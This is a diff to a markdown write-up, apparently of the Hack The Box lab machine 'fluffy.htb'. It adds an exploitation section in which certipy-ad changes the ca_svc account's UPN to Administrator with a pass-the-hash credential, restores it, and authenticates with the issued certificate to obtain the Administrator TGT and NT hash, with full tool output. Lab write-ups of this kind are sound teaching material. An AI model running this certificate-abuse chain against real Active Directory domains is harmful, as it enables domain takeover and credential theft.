@@ -556,6 +556,10 @@ Info: Establishing connection to remote endpoint
 
 ### Exploitation
 
+(not sure if i put all the steps correcly, in case fix them, also separate the commands from the output)
+
+Change ca_svc's UPN to Administrator:
+
 ```shell
 certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn Administrator@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -579,6 +583,32 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 
+```
+
+```
+certipy-ad account update -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.131.175 -dc-host DC01.fluffy.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+
+```
+
+```
+certipy-ad auth -pfx administrator.pfx -username Administrator -domain fluffy.htb -dc-ip 10.129.131.175
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@fluffy.htb'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
 
 ---
